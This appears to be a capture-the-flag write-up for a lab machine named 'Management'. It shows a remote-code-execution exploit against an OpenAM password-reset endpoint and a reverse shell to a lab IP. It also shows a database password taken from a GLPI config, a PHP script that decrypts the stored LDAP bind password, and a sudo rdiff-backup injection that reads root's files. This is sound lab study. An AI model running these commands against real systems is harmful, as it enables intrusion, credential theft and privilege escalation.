# Management


## nmap scan 


```ruby
└─$ nmap -sCV -Pn 10.129.5.23        
Starting Nmap 7.95 ( https://nmap.org ) at 2026-10-13 22:40 UTC
Nmap scan report for 10.129.5.23
Host is up (0.69s latency).
Not shown: 995 closed tcp ports (reset)
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.19 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp    open  http     nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to https://10.129.5.23/
|_http-server-header: nginx/1.24.0 (Ubuntu)
443/tcp   open  ssl/http nginx 1.24.0 (Ubuntu)
|_ssl-date: TLS randomness does not represent time
|_http-title: Did not follow redirect to https://management.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
| ssl-cert: Subject: commonName=management.htb/organizationName=Management Managed Services Ltd
| Subject Alternative Name: DNS:management.htb, DNS:*.management.htb
| Not valid before: 2026-06-02T01:21:44
|_Not valid after:  2126-05-09T01:21:44
| tls-alpn: 
|   http/1.1
|   http/1.0
|_  http/0.9
4444/tcp  open  ssl/ldap
| ssl-cert: Subject: commonName=sso.management.htb/organizationName=Administration Connector RSA Self-Signed Certificate
| Not valid before: 2026-06-02T01:23:59
|_Not valid after:  2046-05-28T01:23:59
| fingerprint-strings: 
|   DNSStatusRequestTCP: 
|     Cannot decode the provided ASN.1 integer element because the length of the element value was not between one and four bytes (actual length was 0)
|     1.3.6.1.4.1.1466.20036
|   Kerberos, RPCCheck, SMBProgNeg: 
|     qCannot decode the ASN.1 element because an unexpected end of file was reached while reading the first length byte
|     1.3.6.1.4.1.1466.20036
|   LDAPSearchReq: 
|     0<0:
|     objectClass1+
|     ds-root-dse
|_    ds-cfg-root-dse-backend0
|_ssl-date: TLS randomness does not represent time
50389/tcp open  ldap     (Anonymous bind OK)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port4444-TCP:V=7.95%T=SSL%I=7%D=10/13%Time=6ACEB3AA%P=x86_64-pc-linux-g
SF:nu%r(RPCCheck,99,"0\x81\x96\x02\x01\0x\x81\x90\n\x01\x02\x04\0\x04qCann
SF:ot\x20decode\x20the\x20ASN\.1\x20element\x20because\x20an\x20unexpected
SF:\x20end\x20of\x20file\x20was\x20reached\x20while\x20reading\x20the\x20f
SF:irst\x20length\x20byte\x8a\x161\.3\.6\.1\.4\.1\.1466\.20036")%r(DNSStat
SF:usRequestTCP,BA,"0\x81\xb7\x02\x01\0x\x81\xb1\n\x01\x02\x04\0\x04\x81\x
SF:91Cannot\x20decode\x20the\x20provided\x20ASN\.1\x20integer\x20element\x
SF:20because\x20the\x20length\x20of\x20the\x20element\x20value\x20was\x20n
SF:ot\x20between\x20one\x20and\x20four\x20bytes\x20\(actual\x20length\x20w
SF:as\x200\)\x8a\x161\.3\.6\.1\.4\.1\.1466\.20036")%r(Kerberos,99,"0\x81\x
SF:96\x02\x01\0x\x81\x90\n\x01\x02\x04\0\x04qCannot\x20decode\x20the\x20AS
SF:N\.1\x20element\x20because\x20an\x20unexpected\x20end\x20of\x20file\x20
SF:was\x20reached\x20while\x20reading\x20the\x20first\x20length\x20byte\x8
SF:a\x161\.3\.6\.1\.4\.1\.1466\.20036")%r(SMBProgNeg,99,"0\x81\x96\x02\x01
SF:\0x\x81\x90\n\x01\x02\x04\0\x04qCannot\x20decode\x20the\x20ASN\.1\x20el
SF:ement\x20because\x20an\x20unexpected\x20end\x20of\x20file\x20was\x20rea
SF:ched\x20while\x20reading\x20the\x20first\x20length\x20byte\x8a\x161\.3\
SF:.6\.1\.4\.1\.1466\.20036")%r(LDAPSearchReq,55,"0E\x02\x01\x07d@\x04\x00
SF:0<0:\x04\x0bobjectClass1\+\x04\x03top\x04\x0bds-root-dse\x04\x17ds-cfg-
SF:root-dse-backend0\x0c\x02\x01\x07e\x07\n\x01\0\x04\0\x04\0");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 114.71 seconds
                                                                                                                                                                           
┌──(kali㉿kali)-[~]

```


## found subdomain 

```
sso.management.htb
```

<img width="1919" height="706" alt="image" src="https://github.com/user-attachments/assets/69f5afc6-84b5-4086-9392-601fc15c98bb" />

## in source code found version 

```

  var require = {
                urlArgs : "v=16.0.5",
                deps : ['main']
```

## i searched for CVES foudn 

[CVE-2026-33439](https://github.com/advisories/GHSA-2cqq-rpvq-g5qj)

**`exploit`**

[CVE-2026-33439](https://github.com/TheMalwareGuardian/CVE-2026-33439/blob/main/README.md)


```
python3 exploit.py --url https://sso.management.htb/openam/ui/PWResetUserValidation "id"

```

<img width="976" height="118" alt="image" src="https://github.com/user-attachments/assets/c4080c7d-712b-4d8d-b483-d582cbe9f9f9" />

## get shell 


```
python3 exploit.py --url https://sso.management.htb/openam/ui/PWResetUserValidation \
  "bash -c 'bash -i >& /dev/tcp/10.10.16.196/4444 0>&1'"
```

<img width="1038" height="158" alt="image" src="https://github.com/user-attachments/assets/fb00d0d4-f0d3-494d-ae61-5ba68a05c2da" />


## after some enum and search foudn 

```php
<?php
class DB extends DBmysql {
   public $dbhost = '127.0.0.1';
   public $dbuser = 'glpi';
   public $dbpassword = '8rhu0L6Pw4Y7';
   public $dbdefault = 'glpidb';
   public $use_utf8mb4 = true;
   public $allow_datetime = false;
   public $allow_signed_keys = false;
}

```

<img width="1434" height="389" alt="image" src="https://github.com/user-attachments/assets/76f97136-9e90-4378-bb8d-6515bf1c39af" />


## Connect to MySQL with the creds

```
mysql -h 127.0.0.1 -u glpi -p'8rhu0L6Pw4Y7' glpidb
```

## we have the encrypted LDAP bind password. Now decrypt it using GLPI's own key


```
avrqW65aZWKzLAKWhPxZGn1eLj3yYAnwUp08mEazsJUWfI5cqbaP6vM12w0p/ykpmyO3Pw==
```

## Dekripsi Password


```
cat > /tmp/dec.php <<'PHP'
<?php
function decryptGlpi(string $b64, string $key): ?string {
    $raw = base64_decode($b64, true);
    if ($raw === false || strlen($raw) < 24) {
        fwrite(STDERR, "[-] base64 invalid\n");
        return null;
    }
    $nonce = substr($raw, 0, SODIUM_CRYPTO_AEAD_XCHACHA20POLY1305_IETF_NPUBBYTES);
    $ct    = substr($raw, SODIUM_CRYPTO_AEAD_XCHACHA20POLY1305_IETF_NPUBBYTES);
    $pt = sodium_crypto_aead_xchacha20poly1305_ietf_decrypt($ct, $nonce, $nonce, $key);
    if ($pt === false) {
        fwrite(STDERR, "[-] decrypt failed\n");
        return null;
    }
    return $pt;
}

function getKey(string $path): ?string {
    if (!is_readable($path)) {
        fwrite(STDERR, "[-] key not readable: $path\n");
        return null;
    }
    $k = file_get_contents($path);
    if (strlen($k) !== SODIUM_CRYPTO_AEAD_XCHACHA20POLY1305_IETF_KEYBYTES) {
        fwrite(STDERR, "[!] key length " . strlen($k) . "\n");
    }
    return $k;
}

$enc = 'avrqW65aZWKzLAKWhPxZGn1eLj3yYAnwUp08mEazsJUWfI5cqbaP6vM12w0p/ykpmyO3Pw==';
$keyPath = $argv[1] ?? '/opt/glpi/config/glpicrypt.key';
$key = getKey($keyPath);
if ($key === null) exit(1);

$pt = decryptGlpi($enc, $key);
if ($pt === null) exit(1);
echo "PASSWORD=[" . $pt . "]\n";
PHP
```

## run 

```
php /tmp/dec.php
```

<img width="608" height="114" alt="image" src="https://github.com/user-attachments/assets/5d8a3f1b-25c6-4986-b8b9-7fbc685e50a6" />

```
PASSWORD=[WpczC40GhTbk]
```

## SSH as owen


```
ssh owen@10.129.5.23
```

<img width="1015" height="281" alt="image" src="https://github.com/user-attachments/assets/f3a7b420-326d-4521-a7f8-0ebe28cfe05f" />

## Privilege Escalation

```
sudo -l
```

<img width="1218" height="134" alt="image" src="https://github.com/user-attachments/assets/228848c9-0606-4b39-b236-4d5140f5fa5e" />




```

rdiff-backup \
  --remote-schema 'sudo /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only --restrict-path / --restrict-mode read-write # %s' \
  backup --include /root/root.txt --exclude '**' \
  localhost::/root /tmp/rflag

find /tmp/rflag -name 'root.txt' -exec cat {} \;
```

<img width="1511" height="237" alt="image" src="https://github.com/user-attachments/assets/08c39ab5-a216-4e48-97a2-ea4e29e407f8" />


















